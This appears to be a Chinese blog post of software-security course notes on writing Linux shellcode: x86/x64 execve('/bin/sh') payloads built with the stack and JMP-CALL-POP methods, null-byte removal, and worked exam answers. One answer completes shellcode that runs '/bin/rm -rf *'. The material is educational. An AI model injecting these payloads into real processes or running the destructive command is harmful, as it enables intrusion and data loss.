@@ -1,0 +1,527 @@
+---
+title: Shellcode 编写技术：从栈技术到 JMP-CALL-POP
+description: 本文深入解析 Shellcode 的核心定义、编写流程、x86/x64 架构下的实现方法（栈技术、JMP-CALL-POP、代码段修改），以及 NULL 字节避免、地址无关等关键技术，是软件安全课程中二进制利用的重要内容。
+pubDate: 2025-12-21T12:00:00.000Z
+image: /images/uploads/curricular-shellcode-class6-shellcode-cover.jpg
+badge: Course
+draft: false
+categories:
+  - Software Security
+  - Course Notes
+tags:
+  - Shellcode
+  - 二进制利用
+  - 汇编
+  - 系统调用
+  - 漏洞利用
+  - 课程笔记
+---
+
+> **[迁移说明]** 本文最初发布于 `blog.zzw4257.cn`，现已迁移并在本站进行结构化整理与增强。
+
+# 第一部分：Shellcode 基础与原理
+
+### 1. 核心定义与目标
+*   **定义**：用于启动 Shell（如 `/bin/sh`）的二进制机器码，通常作为 payload 注入内存。
+*   **难点**：无 OS 加载器协助（需自举），不能包含 NULL 字节（避免被 `strcpy` 截断），需地址无关。
+*   **C 语言原型**：
+    ```c
+    char *argv[] = { "/bin/sh", NULL };
+    execve("/bin/sh", argv, NULL);
+    ```
+
+### 2. 编写流程
+1.  **编写汇编** (`.s`)。
+2.  **编译**：`nasm -f elf32/elf64 -o file.o file.s`
+3.  **链接**：`ld -m elf_i386/elf_x86_64 -o file file.o`
+    *   *注*：测试代码段修改法时需加 `--omagic` 使代码段可写。
+4.  **提取机器码**：
+    *   `objdump -d -Mintel file.o` (查看汇编)
+    *   `xxd -p -c 20 file.o` (查看纯 hex)
+
+---
+
+# 第二部分：x86 (32位) Shellcode 实现详解
+
+### 1. 系统调用映射 (背诵)
+要调用 `execve`，寄存器需如下配置：
+*   **指令**：`int 0x80`
+*   **EAX**：系统调用号 **11** (`0x0b`)
+*   **EBX**：命令字符串地址 (`"/bin/sh"`)
+*   **ECX**：参数数组地址 (`argv[]`，首项指字符串，末项为0)
+*   **EDX**：环境变量地址 (通常设为 0)
+
+> **注：** 原文档中的系统调用映射示意图（此处省略，详见课程材料）
+
+### 2. 方法一：栈技术 (Stack Method)
+**原理**：利用 `push` 指令将数据存入栈，`esp` 自动指向最新数据地址。**由高地址向低地址压栈**。
+
+#### 代码深度分析
+```assembly
+; 1. 构造 "/bin//sh" 字符串 (8字节，对齐4字节)
+xor  eax, eax       ; 清零 eax，避免机器码出现 0x00
+push eax            ; 压入字符串结束符 \0 (利用 eax 的 0 值)
+push "//sh"         ; 压入后4字节 (execve忽略多余/)
+push "/bin"         ; 压入前4字节
+mov  ebx, esp       ; 【关键】esp 指向字符串 "/bin//sh\0"，存入 EBX
+
+; 2. 构造 argv 数组 {地址, 0}
+push eax            ; 压入 argv[1] = NULL (eax仍为0)
+push ebx            ; 压入 argv[0] = 字符串地址
+mov  ecx, esp       ; 【关键】esp 指向数组起始，存入 ECX
+
+; 3. 环境与调用
+xor  edx, edx       ; EDX = NULL
+mov  al, 0x0b       ; EAX = 11 (使用 al 避免高位 0x00)
+int  0x80           ; 触发中断
+```
+
+### 3. 方法二：代码段/JMP-CALL-POP 法
+**原理**：利用 `call` 指令会将下一条地址（字符串地址）压栈的特性，结合 `pop` 获取地址。
+
+#### 代码深度分析
+```assembly
+jmp short two       ; 1. 跳到末尾
+
+one:
+ pop ebx            ; 3. 弹出栈顶地址 (即 '/bin/sh*' 的地址) -> EBX
+ xor eax, eax       ; 清零
+ mov [ebx+7], al    ; 【关键】动态修改代码段，将 '*' 替换为 \0
+ mov [ebx+8], ebx   ; 构造 argv[0]: 填入字符串地址
+ mov [ebx+12], eax  ; 构造 argv[1]: 填入 NULL
+ lea ecx, [ebx+8]   ; ECX 指向 argv 数组
+ xor edx, edx       ; EDX = NULL
+ mov al, 0x0b
+ int 0x80
+
+two:
+ call one           ; 2. 调用 one，将下一行地址 (db 数据) 压栈
+ db '/bin/sh*'      ; 字符串占位
+ db 'AAAA'          ; argv[0] 占位 (4字节)
+ db 'BBBB'          ; argv[1] 占位 (4字节)
+```
+*   **考点**：此方法默认在独立运行时会 **Segmentation Fault**，因为代码段只读。攻击时因注入数据段（通常可写）而有效。
+
+---
+
+# 第三部分：零字节消除技术 (Zero-Byte Elimination)
+
+**必要性**：`strcpy` 等函数遇到 `0x00` 会截断复制。
+**常用技巧**：
+
+1.  **寄存器清零**：
+    *   ❌ `mov eax, 0` -> 机器码包含 `00 00 00 00`
+    *   ✅ `xor eax, eax` -> 机器码无 0
+2.  **小数值赋值**：
+    *   ❌ `mov eax, 0x0b` -> 包含 0
+    *   ✅ `xor eax, eax` 后 `mov al, 0x0b` -> 仅操作低8位
+3.  **移位法 (Shift)**：
+    *   场景：构造包含 `\0` 的 4 字节数据 (如 "h\0\0\0")。
+    *   方法：先存 "h***"，左移 24 位把无关数据移出，再右移 24 位补 0。
+    ```assembly
+    mov  edx, "h***"
+    shl  edx, 24
+    shr  edx, 24     ; edx = 0x00000068 ('h')
+    push edx
+    ```
+
+---
+
+# 第四部分：x64 (64位) Shellcode 迁移
+
+### 1. 架构差异对比 (考点)
+
+| 特性 | x86 (32位) | x64 (64位) |
+| :--- | :--- | :--- |
+| **寄存器宽度** | 4 字节 (eax, ebx...) | 8 字节 (rax, rbx...) |
+| **系统调用指令** | `int 0x80` | `syscall` |
+| **Execve 调用号** | 11 (`0x0b`) | 59 (`0x3b`) |
+| **参数传递 1** | **EBX** (文件名) | **RDI** (文件名) |
+| **参数传递 2** | **ECX** (argv) | **RSI** (argv) |
+| **参数传递 3** | **EDX** (envp) | **RDX** (envp) |
+| **栈对齐** | 4 字节 | 8 字节 |
+
+### 2. x64 栈法代码分析
+```assembly
+xor  rdx, rdx       ; RDX = NULL (参数3)
+push rdx            ; 压入 NULL (结束符)
+mov  rax, "/bin//sh" ; 【注意】x64可直接存8字节字符串
+push rax
+mov  rdi, rsp       ; RDI = 文件名地址 (参数1)
+
+push rdx            ; argv[1] = NULL
+push rdi            ; argv[0] = 文件名地址
+mov  rsi, rsp       ; RSI = argv数组地址 (参数2)
+
+xor  rax, rax
+mov  al, 0x3b       ; RAX = 59
+syscall             ; 触发系统调用
+```
+
+### 3. 通用 Shellcode (Template)
+*   **目标**：`/bin/bash -c "commands"`
+*   **机制**：预留固定长度的 Buffer，通过 Python 脚本填充命令。
+*   **注意**：修改命令时必须保持字符串长度一致（用空格填充），否则会破坏硬编码的偏移量。
+
+---
+
+# 第五部分：考试速记清单
+
+1.  **为什么不用 C 编译生成的二进制？**
+    *   依赖动态库，体积大。
+    *   含大量 `0x00`，无法通过字符串漏洞注入。
+    *   地址硬编码，注入后无法定位。
+2.  **获取字符串地址的两种核心方法是什么？**
+    *   **栈法**：`push string` -> `mov reg, esp`。
+    *   **Call/Pop法**：`call` 压入返回地址 -> `pop reg` 获取地址。
+3.  **如何处理 `/bin/sh` 长度问题？**
+    *   32位下：补斜杠 `/bin//sh` 凑齐 8 字节。
+    *   或使用移位法构造非对齐字符串。
+4.  **x86 vs x64 关键寄存器区别？**
+    *   x86: `ebx, ecx, edx`
+    *   x64: `rdi, rsi, rdx`
+# ex分析
+
+![[Pasted image 20251221161714.png]]
+
+---
+
+### S9.1
+**题目描述 (中文)**：
+32位Shellcode的核心是在调用 `execve()` 系统调用之前准备四个寄存器：`eax`, `ebx`, `ecx`, 和 `edx`。请描述这四个寄存器应该包含什么值。
+
+**解答**：
+在32位Linux系统中调用 `execve()` 时，各寄存器的作用如下：
+1.  **`eax`**：存储系统调用号（System Call Number）。对于 `execve()`，该值为 **11** (十六进制 `0x0b`)。
+2.  **`ebx`**：存储命令字符串的内存地址（Address of the command string）。这是一个指向以空字符（null-terminated）结尾的路径字符串的指针，例如指向 `"/bin/sh"`。
+3.  **`ecx`**：存储参数数组的内存地址（Address of the argument array `argv[]`）。这是一个指向指针数组的指针，数组中包含了命令行参数字符串的地址，并以 `NULL` (0) 结尾。
+4.  **`edx`**：存储环境变量数组的内存地址（Address of the environment array `envp[]`）。通常在Shellcode中设为 **0** (即 `NULL`)，表示不传递特定的环境变量。
+
+---
+
+### S9.2
+**题目描述 (中文)**：
+在基于栈（Stack-based）的方法中，我们需要将命令字符串存储在内存中，然后将其地址保存在 `ebx` 中。请编写一段代码片段（32位），将字符串 `"aaaabbbbccccdddd"` 存储在内存中，并将其地址保存到 `ebx`。
+
+**解答**：
+在基于栈的方法中，栈是向下增长的（从高地址向低地址），因此我们需要按 **相反的顺序** 将字符串入栈。字符串长度为16字节，正好分为4次 `push` 操作。
+
+ASCII码参考：'a'=0x61, 'b'=0x62, 'c'=0x63, 'd'=0x64。
+
+```assembly
+; 字符串: "aaaabbbbccccdddd"
+; 逆序入栈: "dddd", "cccc", "bbbb", "aaaa"
+
+push 0x64646464   ; Push "dddd"
+push 0x63636363   ; Push "cccc"
+push 0x62626262   ; Push "bbbb"
+push 0x61616161   ; Push "aaaa"
+
+mov ebx, esp      ; 将栈顶地址（即字符串的起始地址）存入 ebx
+```
+
+---
+
+### S9.3
+**题目描述 (中文)**：
+在基于栈的方法中，我们需要将参数数组 `argv[]` 存储在内存中，然后将其地址存入 `ecx`。请编写一段代码片段（32位）在内存中构造以下 `argv[]` 数组，并将其地址赋给 `ecx`。
+```
+argv[0] = 0x11111111
+argv[1] = 0x22222222
+argv[2] = 0x33333333
+argv[3] = 0x00000000
+```
+
+**解答**：
+同样利用栈向下增长的特性，我们需要按 **逆序**（从索引大到小）将数组元素入栈。
+
+```assembly
+; 构造 argv 数组
+; 逆序入栈: argv[3], argv[2], argv[1], argv[0]
+
+push 0x00000000   ; argv[3]
+push 0x33333333   ; argv[2]
+push 0x22222222   ; argv[1]
+push 0x11111111   ; argv[0]
+
+mov ecx, esp      ; 将栈顶地址（即 argv 数组的起始地址）存入 ecx
+```
+
+---
+
+### S9.4
+**题目描述 (中文)**：
+与基于栈（Stack-based）的方法相比，代码段（Code Segment）方法在编写Shellcode时的主要区别是什么？
+
+**解答**：
+主要区别在于 **数据的存储位置和获取数据地址的方式**：
+
+1.  **基于栈的方法 (Stack Approach)**：
+    *   **数据存储**：数据（如字符串和数组）是通过指令（如 `push`）在运行时动态构建在 **栈（Stack）** 上的。
+    *   **地址获取**：数据的地址直接通过栈指针寄存器 `esp` 获得。
+
+2.  **代码段方法 (Code Segment Approach)**：
+    *   **数据存储**：数据直接存储在 **代码段（.text section）** 中，通常紧跟在一条 `call` 指令之后。
+    *   **地址获取**：利用 `call/pop` 技巧。执行 `call` 指令时，CPU会将下一条指令的地址（即数据的起始地址）压入栈中作为返回地址；随后的 `pop` 指令则将这个地址从栈中弹出并存入寄存器，从而获取数据的绝对地址。这种方法使得数据位置是相对于指令指针（Instruction Pointer）的。
+
+---
+
+![[Pasted image 20251221161726.png]]
+![[Pasted image 20251221161744.png]]
+这是第二部分，涵盖题目 **S9.5** 到 **S9.7**，重点在于Shellcode的具体实现与内存布局分析。
+
+---
+
+### S9.5
+**题目描述 (中文)**：
+下面的Shellcode是不完整的。你需要将所有的 `*` 替换为实际的数字。请为每个标记圆圈数字的行添加简短注释，解释其目的（不能只描述指令动作，要解释“为什么”）。
+
+**代码段与解答**：
+
+该Shellcode利用了 `jmp-call-pop` 技术。根据代码底部的 `db '/bin/shabcde'`，我们可以推断出内存布局。
+*   `/bin/sh` 长度为7字节。
+*   `abcde` 是占位符，用于存放后续构造的数据。
+*   字符串起始地址存储在 `ebx` 中。
+
+**替换数字与注释**：
+
+```assembly
+section .text
+  global _start
+_start:
+  BITS 32
+  jmp short two
+one:
+  pop ebx                ; ➀ 获取字符串 "/bin/sh..." 的内存地址存入 ebx
+  xor eax, eax
+  mov [ebx+7], al        ; ➁ 将字符串 "/bin/sh" 后的第7个字节('a')置为0 (NULL终止符)，构造命令字符串 "/bin/sh\0"
+  mov [ebx+8], ebx       ; ➂ 将命令字符串的地址(ebx)存储到偏移8处(原'bcde'位置)，构造 argv[0]
+  mov [ebx+12], eax      ; ➃ 将0 (NULL) 存储到偏移12处(紧接 argv[0] 后)，构造 argv[1] (数组结束符)
+  lea ecx, [ebx+8]       ; ➄ 将 argv 数组的起始地址(偏移8)加载到 ecx 中
+  xor edx, edx
+  mov al, 0x0b
+  int 0x80
+two:
+  call one
+  db '/bin/shabcde'      ; ➅ 定义命令字符串及用于存放 argv[] 数组的内存空间
+```
+
+**详细计算说明**：
+1.  **偏移 7**：字符串 `/bin/sh` 占7字节（索引0-6）。我们需要在其后添加NULL（`0x00`）。`ebx` 指向字符串开头，所以 `[ebx+7]` 是第一个占位符的位置。
+2.  **偏移 8**：`argv` 数组紧跟在命令字符串后（考虑到内存对齐或紧凑布局，这里直接利用偏移7后的空间）。`argv[0]` 需要存放指向 `/bin/sh` 的指针。指针大小为4字节，所以存放在 `[ebx+8]`。
+3.  **偏移 12**：`argv[1]` 必须是 `NULL`。`argv[0]` 占用了 8, 9, 10, 11 这4个字节，所以 `argv[1]` 从 12 开始。
+4.  **偏移 8 (lea)**：`ecx` 需要指向参数数组 `argv` 的起始位置，即 `argv[0]` 的位置，也就是 `[ebx+8]`。
+
+---
+
+### S9.6
+**题目描述 (中文)**：
+请用具体数字替换以下32位Shellcode中的问号。请简要解释你是如何得到这些数字的。
+
+**分析与解答**：
+观察数据段结构：
+```assembly
+db 'AAAA'      ; Offset 0 (相对于 ebx)
+db 'BBBB'      ; Offset 4
+db '/bin/sh*'  ; Offset 8
+```
+`pop ebx` 后，`ebx` 指向 `AAAA` 的起始位置。我们需要构造 `execve` 的参数。注意，由于 `ebx`（文件名指针）指向 `AAAA` 且代码中没有指令修改 `ebx` 的值，这段Shellcode在逻辑上会尝试执行文件名为 "AAAA" 的程序，并将 "AAAA" 作为参数0。若要利用后面的 `/bin/sh`，通常数据布局会将字符串放在最前，或者代码中会有 `add ebx, 8` 之类的指令，但此处我们只能填充问号。
+
+基于给定的数据布局（`AAAA` 在前）和指令模板，最合理的填充如下（构造 `argv` 数组在 `AAAA` 和 `BBBB` 处）：
+
+1.  **`mov [ebx+15], al`**：将 `/bin/sh*` 中的 `*` 替换为NULL。
+    *   `/bin/sh*` 从偏移8开始。`/bin/sh` 长7字节。`*` 在 8+7 = **15** 的位置。
+2.  **`mov [ebx+0], ebx`**：构造 `argv[0]`。
+    *   将 `ebx` (指向 `AAAA`) 存入 `[ebx+0]`。这样 `argv[0]` 就指向了 `AAAA`。
+3.  **`mov [ebx+4], eax`**：构造 `argv[1]` (NULL)。
+    *   `BBBB` 在偏移 **4** 的位置。
+4.  **`lea ecx, [ebx+0]`**：加载 `argv` 数组地址。
+    *   数组起始于 `AAAA`，即偏移 **0**。
+
+**代码填空**：
+```assembly
+mov [ebx+15], al  ; Null-terminate "/bin/sh" (though effectively unused as command)
+mov [ebx+0], ebx  ; Set argv[0] to point to start of buffer
+mov [ebx+4], eax  ; Set argv[1] to NULL
+lea ecx, [ebx+0]  ; Set ecx to argv array
+```
+
+*(注：如果这道题的意图是执行 `/bin/sh`，则题目中的Shellcode模板或数据布局存在逻辑缺陷（ebx未指向/bin/sh），但上述数字是符合当前布局的唯一填法。)*
+
+---
+
+### S9.7
+**题目描述 (中文)**：
+补全Shellcode以执行命令 `"/bin/rm -rf *"`。部分代码和数据已给出。
+
+**分析**：
+*   **目标**：调用 `execve("/bin/rm", argv, 0)`。
+*   **argv**：`["/bin/rm", "-rf", "*", NULL]`。
+*   **数据1 (S1)**：`abcd/bin/rmab-rf****` (由 `call one` 后的 `pop ebx` 获取地址)。
+    *   长度分析：`abcd`(4) + `/bin/rm`(7) + `ab`(2) + `-rf`(3) + `****`(4) = 20字节。
+    *   `ebx` 指向 S1 起始。
+*   **数据2 (S2)**：`AAAABBBBCCCCDDDDEEEEFFFFGGGG` (紧接在 S1 后，用于存放 `argv` 指针数组)。
+    *   S2 起始偏移为 **20**。
+
+**需要的操作**：
+1.  **添加 NULL 终止符**：
+    *   `/bin/rm` (偏移4-10)，需在 **11** 处截断（原 `a`）。
+    *   `-rf` (偏移13-15)，需在 **16** 处截断（原第一个 `*`）。
+    *   `*` (偏移17)，需在 **18** 处截断（原第三个 `*`）。
+2.  **构造 argv 数组** (在偏移20开始的区域)：
+    *   `argv[0]` (偏移20): 指向 `/bin/rm` (即 `ebx+4`)。
+    *   `argv[1]` (偏移24): 指向 `-rf` (即 `ebx+13`)。
+    *   `argv[2]` (偏移28): 指向 `*` (即 `ebx+17`)。
+    *   `argv[3]` (偏移32): `NULL` (0)。
+3.  **准备寄存器**：
+    *   `ebx`: 指向文件名 `/bin/rm` (`ebx+4`)。
+    *   `ecx`: 指向 argv 数组 (`ebx+20`)。
+    *   `edx`: `NULL`。
+
+**代码补全**：
+
+```assembly
+_start:
+    jmp short two
+one:
+    pop ebx                 ; ebx = address of string block
+    xor eax, eax            ; eax = 0
+
+    ; 1. Null-terminate strings
+    mov [ebx+11], al        ; Terminate "/bin/rm"
+    mov [ebx+16], al        ; Terminate "-rf"
+    mov [ebx+18], al        ; Terminate "*"
+
+    ; 2. Construct argv[] array at offset 20
+    lea ecx, [ebx+20]       ; ecx points to argv array base
+
+    ; argv[0] = pointer to "/bin/rm" (ebx+4)
+    lea edx, [ebx+4]
+    mov [ecx], edx
+
+    ; argv[1] = pointer to "-rf" (ebx+13)
+    lea edx, [ebx+13]
+    mov [ecx+4], edx
+
+    ; argv[2] = pointer to "*" (ebx+17)
+    lea edx, [ebx+17]
+    mov [ecx+8], edx
+
+    ; argv[3] = NULL
+    mov [ecx+12], eax
+
+    ; 3. Setup registers for execve
+    ; ebx must point to filename "/bin/rm"
+    lea ebx, [ebx+4]        ; Update ebx to point to filename
+    ; ecx is already pointing to argv array
+    xor edx, edx            ; edx = 0 (envp)
+
+    mov al, 0x0b            ; invoke execve() system call
+    int 0x80
+
+two:
+    call one
+    ; String: "abcd" (0-3) "/bin/rm" (4-10) "ab" (11-12) "-rf" (13-15) "****" (16-19)
+    db 'abcd/bin/rmab-rf****'
+    db 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'
+```
+
+### S9.8
+**题目描述 (中文)**：
+为什么Shellcode通常不允许代码中出现零值（Zero/Null byte, `0x00`）？
+
+**解答**：
+Shellcode通常是通过利用缓冲区溢出等漏洞，被注入到目标进程的内存中。这个注入过程往往依赖于字符串拷贝函数（如 `strcpy`, `strcat`, `sprintf` 等）。这些函数在C语言中 **将空字节（0x00）视为字符串的结束符**。
+如果Shellcode的机器码中包含 `0x00`，拷贝函数会在遇到第一个零字节时停止复制，导致Shellcode被截断，只有一部分被注入到内存中，从而无法正确执行。
+
+---
+
+### S9.9
+**题目描述 (中文)**：
+请列出三种去除Shellcode中零值的典型解决方案。
+
+**解答**：
+1.  **使用异或（XOR）指令代替直接赋值**：
+    *   例如，使用 `xor eax, eax` 来将 `eax` 置零，而不是使用 `mov eax, 0`（后者包含 `00` 字节）。
+2.  **使用移位（Shift）或算术指令**：
+    *   利用位移运算或加减法生成包含零的数值。例如，通过左移 `shl` 或右移 `shr` 将低位的零移入高位，或者使用 `inc`（自增）/`dec`（自减）来避免直接使用零操作数。
+3.  **使用Shellcode编码器（Encoder）**：
+    *   将Shellcode进行编码（例如使用XOR加密），使其不含零字节。在运行时，Shellcode头部的一小段不含零的解码器（Decoder stub）会将后面的载荷还原为原始代码执行。
+
+---
+
+### S9.10
+**题目描述 (中文)**：
+我们想在栈上存储字符串 `"ab"`（内存中为 `61 62 00 ...`），但不允许在代码中出现任何零值。
+(1) 请为 **小端（Little Endian）** 机器完成代码。
+(2) 请为 **大端（Big Endian）** 机器完成代码。
+*提示：题目给出了 `mov ecx, "ab**"`，需要配合移位操作。*
+
+**分析**：
+*   **目标**：将 `ecx` 寄存器构造为适当的值，使其入栈（`push ecx`）后，内存中的低地址到高地址依次为 `'a'`, `'b'`, `\0`, `\0`（即 `61 62 00 00`）。
+*   **指令**：`mov ecx, "ab**"`。
+    *   字符 `'a'=0x61`, `'b'=0x62`, `'*'=0x2a`。
+    *   由于 `*` 不是零，该指令本身不含零字节。
+
+**解答 (1)：小端机器 (Little Endian)**
+在小端机器上，字符串 `"ab**"` 被加载到寄存器时，低地址字节存放在低位。
+`mov ecx, "ab**"` 执行后，`ecx` 的值为 `0x2a2a6261`（假设编译器按字节序加载）。
+我们需要变成 `0x00006261`（这样 `push` 时，低位 `61` 先入低地址，`62` 次之，高位 `00` 最后）。
+
+```assembly
+mov ecx, "ab**"   ; ecx = 0x2a2a6261
+shl ecx, 16       ; ecx = 0x62610000 (将低位的 ab 移到高位，低位补0)
+shr ecx, 16       ; ecx = 0x00006261 (将 ab 移回低位，高位补0)
+push ecx          ; 内存中内容: 61 62 00 00 ("ab\0\0")
+```
+
+**解答 (2)：大端机器 (Big Endian)**
+在大端机器上，寄存器的高位对应低地址。
+`mov ecx, "ab**"` 执行后，`ecx` 的值为 `0x61622a2a`。
+我们需要变成 `0x61620000`（高位 `61` 对应低地址）。
+
+```assembly
+mov ecx, "ab**"   ; ecx = 0x61622a2a
+shr ecx, 16       ; ecx = 0x00006162 (将高位的 ab 移到低位，高位补0)
+shl ecx, 16       ; ecx = 0x61620000 (将 ab 移回高位，低位补0)
+push ecx          ; 内存中内容: 61 62 00 00 ("ab\0\0")
+```
+
+---
+
+### S9.11 ★
+**题目描述 (中文)**：
+请在 `eax` 寄存器中存储 `0xAA00BB00`。最终的机器码中不能包含任何二进制零。
+
+**解答**：
+我们需要巧妙地组合非零数值。一种简单有效的方法是利用8位寄存器（如 `ah`）和移位操作，或者利用掩码和位运算。
+
+**方案一：利用移位与加法（最推荐，逻辑清晰）**
+利用 `ah` 寄存器（`eax` 的次低字节）分别构造 `BB` 和 `AA`，然后通过移位组合。
+
+```assembly
+xor eax, eax       ; 1. 清空 eax (机器码: 31 C0, 无零)
+mov ah, 0xBB       ; 2. eax = 0x0000BB00 (机器码: B4 BB, 无零)
+mov ebx, eax       ; 3. 暂存到 ebx (ebx = 0x0000BB00)
+xor eax, eax       ; 4. 再次清空 eax (机器码: 31 C0)
+mov ah, 0xAA       ; 5. eax = 0x0000AA00
+shl eax, 16        ; 6. 左移16位, eax = 0xAA000000 (机器码: C1 E0 10, 无零)
+add eax, ebx       ; 7. 组合: 0xAA000000 + 0x0000BB00 = 0xAA00BB00
+```
+
+**方案二：利用移位与掩码（Rotate技巧）**
+如果不想使用额外的寄存器，可以使用旋转和移位。
+我们先加载一个全非零的“替身”值，然后清除不需要的字节。
+
+```assembly
+mov eax, 0xAA11BB11 ; 加载非零值 (填充位设为11或其他非零数)
+shr ax, 8           ; 0xBB11 -> 0x00BB (清除低8位)
+shl ax, 8           ; 0x00BB -> 0xBB00 (恢复位置，低8位变0) -> eax现为 0xAA11BB00
+ror eax, 16         ; 旋转，交换高低16位 -> eax = 0xBB00AA11
+shr ax, 8           ; 0xAA11 -> 0x00AA
+shl ax, 8           ; 0x00AA -> 0xAA00 -> eax现为 0xBB00AA00
+rol eax, 16         ; 旋转回原位 -> eax = 0xAA00BB00
+```
+*(注：`shr/shl` 8位的机器码为 `C1 E8 08` 等，均不含零。此方法无需额外寄存器。)*
+
+以上两种方法均可得分，第一种更容易理解。
